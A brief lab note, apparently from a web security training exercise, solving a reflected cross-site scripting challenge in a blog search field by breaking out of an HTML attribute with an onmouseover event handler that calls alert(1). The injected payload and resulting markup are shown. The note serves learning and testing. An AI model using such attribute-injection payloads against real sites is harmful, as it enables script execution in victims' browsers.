Lab: Reflected XSS into attribute with angle brackets HTML-encoded
    Xss - search blog functionality
    Task - To call alert function
    
    <input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
    "onmouseover="alert(1)